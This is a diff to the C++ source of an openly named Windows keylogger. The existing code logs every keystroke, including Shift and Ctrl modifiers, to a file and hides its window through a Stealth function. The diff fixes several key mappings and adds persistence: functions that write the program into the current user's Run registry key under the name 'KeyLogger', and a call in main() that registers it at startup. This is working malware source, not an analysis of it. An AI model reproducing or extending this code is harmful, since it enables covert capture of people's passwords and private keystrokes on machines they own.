@@ -112,11 +112,9 @@ int Save(unsigned int key_stroke, const char *file)
 		}
 	}
 
-
+	
 	std::cout << key_stroke << '\n';
-	/*These two functions are not working correctly rn, need to be fixed
-	Currently --> If any special key is pressed then it will always print shiftKeyText and/or ctrlKeyText*/
-	const char *shiftKeyText = shiftKeyPressed ? "[SHIFT]+" : "";
+ 	const char *shiftKeyText = shiftKeyPressed ? "[SHIFT]+" : "";
 	const char *ctrlKeyText = ctrlKeyPressed ? "[CTRL]+" : "";
 
 	switch (key_stroke)
@@ -143,7 +141,7 @@ int Save(unsigned int key_stroke, const char *file)
 		fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[HOME]");
 		break;
 	case VK_LEFT:
-		fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[L]");
+		fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[LEFT]");
 		break;
 	case VK_UP:
 		fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[UP]");
@@ -152,6 +150,7 @@ int Save(unsigned int key_stroke, const char *file)
 		fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[RIGHT]");
 		break;
 	case VK_DOWN:
+		fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[DOWN]");
 		break;
 	case 20:
 		fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[CAPSLOCK]");
@@ -234,6 +233,8 @@ int Save(unsigned int key_stroke, const char *file)
 			fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "}");
 		else
 			fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "]");
+		break;
+	case 161:
 		break;
 	case 186:
 		if (shiftKeyPressed)
@@ -355,8 +356,95 @@ void Stealth()
 #endif // invisible
 }
 
+BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwRegType = REG_SZ;
+	wchar_t szPathToExe[MAX_PATH] = {};
+	DWORD dwSize = sizeof(szPathToExe);
+
+	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (fSuccess)
+	{
+		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
+{
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	wchar_t szValue[count] = {};
+
+
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args != NULL)
+	{
+		// caller should make sure "args" is quoted if any single argument has a space
+		// e.g. (L"-name \"Mark Voidale\"");
+		wcscat_s(szValue, count, args);
+	}
+
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		dwSize = (wcslen(szValue) + 1) * 2;
+		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+void RegisterProgram()
+{
+	wchar_t szPathToExe[MAX_PATH];
+
+	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+	RegisterMyProgramForStartup(L"KeyLogger", szPathToExe, L"-foobar");
+}
+
+
 int main()
 {
+	if (IsMyProgramRegisteredForStartup(L"KeyLogger") == false)
+		RegisterProgram();
+
 	startTime = clock();
 
 	// visibility of window
